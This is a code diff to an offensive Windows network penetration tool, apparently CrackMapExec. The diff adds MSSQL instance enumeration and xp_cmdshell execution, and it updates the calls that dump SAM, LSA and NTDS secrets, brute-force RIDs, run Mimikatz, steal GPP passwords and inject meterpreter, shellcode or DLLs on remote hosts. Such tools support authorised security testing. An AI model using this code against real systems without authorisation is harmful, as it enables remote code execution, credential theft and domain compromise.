@@ -1,5 +1,7 @@
 from logger import *
 from powershell import *
+from impacket import tds
+from scripts.mssqlclient import *
 from impacket.nmb import NetBIOSError
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.dcerpc.v5.rpcrt import DCERPCException
@@ -23,12 +25,50 @@ import socket
 import settings
 import traceback
 import socket
+import logging
 
-def connect(host):
-    '''
-        My imagination flowed free when coming up with this name
-        This is where all the magic happens
-    '''
+def mssql_greenlet(host, server_name, domain):
+
+    cme_logger = CMEAdapter(logging.getLogger('CME'), {'host': host, 
+                                                       'hostname': server_name,
+                                                       'port': settings.args.mssql_port,
+                                                       'service': 'MSSQL'})
+
+    try:
+        ms_sql = tds.MSSQL(host, int(settings.args.mssql_port), cme_logger)
+        ms_sql.connect()
+    except socket.error as e:
+        if settings.args.verbose: print_error(str(e))
+        return
+
+    if settings.args.mssql_instance:
+        instances = ms_sql.getInstances(5)
+        if len(instances) == 0:
+            cme_logger.info("No MSSQL Instances found")
+        else:
+            cme_logger.success("Enumerating MSSQL instances")
+            for i, instance in enumerate(instances):
+                cme_logger.results("Instance {}".format(i))
+                for key in instance.keys():
+                   cme_logger.results(key + ":" + instance[key])
+
+    if settings.args.mssql is not None:
+        ms_sql = smart_login(host, domain, ms_sql, cme_logger)
+        sql_shell = SQLSHELL(ms_sql, cme_logger)
+
+        if settings.args.mssql != '':
+            sql_shell.onecmd(settings.args.mssql)
+
+        if settings.args.enable_xpcmdshell:
+            sql_shell.onecmd('enable_xp_cmdshell')
+
+        if settings.args.disable_xpcmdshell:
+            sql_shell.onecmd('disable_xp_cmdshell')
+
+        if settings.args.xp_cmd:
+            sql_shell.onecmd("xp_cmdshell {}".format(settings.args.xp_cmd))
+
+def main_greenlet(host):
 
     try:
 
@@ -46,7 +86,16 @@ def connect(host):
             if not domain:
                 domain = s_name
 
-        print_status(u"{}:{} is running {} (name:{}) (domain:{})".format(host, settings.args.port, smb.getServerOS(), s_name, domain))
+        cme_logger = CMEAdapter(logging.getLogger('CME'), {'host': host, 
+                                                           'hostname': s_name,
+                                                           'port': settings.args.port,
+                                                           'service': 'SMB'})
+
+        cme_logger.info("{} (name:{}) (domain:{})".format(smb.getServerOS(), s_name, domain))
+
+        if settings.args.mssql_instance or settings.args.mssql is not None:
+            mssql_greenlet(host, s_name, domain)
+            return
 
         try:
             '''
@@ -62,12 +111,12 @@ def connect(host):
 
         if (settings.args.user is not None and (settings.args.passwd is not None or settings.args.hash is not None)) or settings.args.combo_file:
 
-            smb = smart_login(host, smb, domain)
+            smb = smart_login(host, domain, smb, cme_logger)
             #Get our IP from the socket
             local_ip = smb.getSMBServer().get_socket().getsockname()[0]
 
             if settings.args.delete or settings.args.download or settings.args.list or settings.args.upload:
-                rfs = RemoteFileSystem(host, smb)
+                rfs = RemoteFileSystem(host, smb, cme_logger)
                 if settings.args.delete:
                     rfs.delete()
                 if settings.args.download:
@@ -78,11 +127,12 @@ def connect(host):
                     rfs.list()
 
             if settings.args.enum_shares:
-                shares = SHAREDUMP(smb)
+                shares = SHAREDUMP(smb, cme_logger)
                 shares.dump(host)
 
             if settings.args.enum_users:
-                users = SAMRDump('{}/SMB'.format(settings.args.port),
+                users = SAMRDump(cme_logger,
+                                 '{}/SMB'.format(settings.args.port),
                                  settings.args.user, 
                                  settings.args.passwd, 
                                  domain, 
@@ -92,8 +142,7 @@ def connect(host):
                 users.dump(host)
 
             if settings.args.sam or settings.args.lsa or settings.args.ntds:
-                dumper = DumpSecrets(host,
-                                     settings.args.port,
+                dumper = DumpSecrets(cme_logger,
                                      'logs/{}'.format(host),
                                      smb,
                                      settings.args.kerb)
@@ -110,17 +159,19 @@ def connect(host):
                 dumper.cleanup()
 
             if settings.args.pass_pol:
-                pass_pol = PassPolDump('{}/SMB'.format(settings.args.port),
+                pass_pol = PassPolDump(cme_logger,
+                                 '{}/SMB'.format(settings.args.port),
                                  settings.args.user, 
                                  settings.args.passwd, 
-                                 domain, 
+                                 domain,
                                  settings.args.hash, 
                                  settings.args.aesKey,
                                  settings.args.kerb)
                 pass_pol.dump(host)
 
             if settings.args.rid_brute:
-                lookup = LSALookupSid(settings.args.user,
+                lookup = LSALookupSid(cme_logger,
+                                      settings.args.user,
                                       settings.args.passwd,
                                       domain,
                                       '{}/SMB'.format(settings.args.port), 
@@ -129,7 +180,8 @@ def connect(host):
                 lookup.dump(host)
 
             if settings.args.enum_sessions or settings.args.enum_disks or settings.args.enum_lusers:
-                rpc_query = RPCQUERY(settings.args.user, 
+                rpc_query = RPCQUERY(cme_logger,
+                                     settings.args.user, 
                                      settings.args.passwd, 
                                      domain, 
                                      settings.args.hash)
@@ -142,12 +194,13 @@ def connect(host):
                     rpc_query.enum_lusers(host)
 
             if settings.args.spider:
-                smb_spider = SMBSPIDER(host, smb)
+                smb_spider = SMBSPIDER(cme_logger, host, smb)
                 smb_spider.spider(settings.args.spider, settings.args.depth)
                 smb_spider.finish()
 
             if settings.args.wmi_query:
-                wmi_query = WMIQUERY(settings.args.user, 
+                wmi_query = WMIQUERY(cme_logger,
+                                     settings.args.user, 
                                      settings.args.passwd, 
                                      domain, 
                                      settings.args.hash,
@@ -157,19 +210,19 @@ def connect(host):
                 wmi_query.run(settings.args.wmi_query, host, settings.args.namespace)
 
             if settings.args.check_uac:
-                uac = UACdump(smb, settings.args.kerb)
+                uac = UACdump(cme_logger, smb, settings.args.kerb)
                 uac.run()
 
-            if settings.args.enable_wdigest:
-                wdigest = WdisgestEnable(smb, settings.args.kerb)
-                wdigest.enable()
-
-            if settings.args.disable_wdigest:
-                wdigest = WdisgestEnable(smb, settings.args.kerb)
-                wdigest.disable()
+            if settings.args.enable_wdigest or settings.args.disable_wdigest:
+                wdigest = WdisgestEnable(cme_logger, smb, settings.args.kerb)
+                if settings.args.enable_wdigest:
+                    wdigest.enable()
+                elif settings.args.disable_wdigest:
+                    wdigest.disable()
 
             if settings.args.service:
-                service_control = SVCCTL(settings.args.user, 
+                service_control = SVCCTL(cme_logger,
+                                         settings.args.user, 
                                          settings.args.passwd, 
                                          domain,
                                          '{}/SMB'.format(settings.args.port),
@@ -178,39 +231,39 @@ def connect(host):
                 service_control.run(host)
 
             if settings.args.command:
-                EXECUTOR(settings.args.command, host, domain, settings.args.no_output, smb, settings.args.execm)
+                EXECUTOR(cme_logger, settings.args.command, host, domain, settings.args.no_output, smb, settings.args.execm)
 
             if settings.args.pscommand:
-                EXECUTOR(ps_command(settings.args.pscommand), host, domain, settings.args.no_output, smb, settings.args.execm)
+                EXECUTOR(cme_logger, ps_command(settings.args.pscommand), host, domain, settings.args.no_output, smb, settings.args.execm)
 
             if settings.args.mimikatz:
                 powah_command = PowerShell(settings.args.server, local_ip)
-                EXECUTOR(powah_command.mimikatz(), host, domain, True, smb, settings.args.execm)
+                EXECUTOR(cme_logger, powah_command.mimikatz(), host, domain, True, smb, settings.args.execm)
 
             if settings.args.gpp_passwords:
                 powah_command = PowerShell(settings.args.server, local_ip)
-                EXECUTOR(powah_command.gpp_passwords(), host, domain, True, smb, settings.args.execm)      
+                EXECUTOR(cme_logger, powah_command.gpp_passwords(), host, domain, True, smb, settings.args.execm)      
 
             if settings.args.mimikatz_cmd:
                 powah_command = PowerShell(settings.args.server, local_ip)
-                EXECUTOR(powah_command.mimikatz(settings.args.mimikatz_cmd), host, domain, True, smb, settings.args.execm)
+                EXECUTOR(cme_logger, powah_command.mimikatz(settings.args.mimikatz_cmd), host, domain, True, smb, settings.args.execm)
 
             if settings.args.powerview:
                 #For some reason powerview functions only seem to work when using smbexec...
                 #I think we might have a mistery on our hands boys and girls!
                 powah_command = PowerShell(settings.args.server, local_ip)
-                EXECUTOR(powah_command.powerview(settings.args.powerview), host, domain, True, smb, 'smbexec')
+                EXECUTOR(cme_logger, powah_command.powerview(settings.args.powerview), host, domain, True, smb, 'smbexec')
 
             if settings.args.inject:
                 powah_command = PowerShell(settings.args.server, local_ip)
                 if settings.args.inject.startswith('met_'):
-                    EXECUTOR(powah_command.inject_meterpreter(), host, domain, True, smb, settings.args.execm)
+                    EXECUTOR(cme_logger, powah_command.inject_meterpreter(), host, domain, True, smb, settings.args.execm)
 
                 if settings.args.inject == 'shellcode':
-                    EXECUTOR(powah_command.inject_shellcode(), host, domain, True, smb, settings.args.execm)
+                    EXECUTOR(cme_logger, powah_command.inject_shellcode(), host, domain, True, smb, settings.args.execm)
 
                 if settings.args.inject == 'dll' or settings.args.inject == 'exe':
-                    EXECUTOR(powah_command.inject_exe_dll(), host, domain, True, smb, settings.args.execm)
+                    EXECUTOR(cme_logger, powah_command.inject_exe_dll(), host, domain, True, smb, settings.args.execm)
         try:
             smb.logoff()
         except:
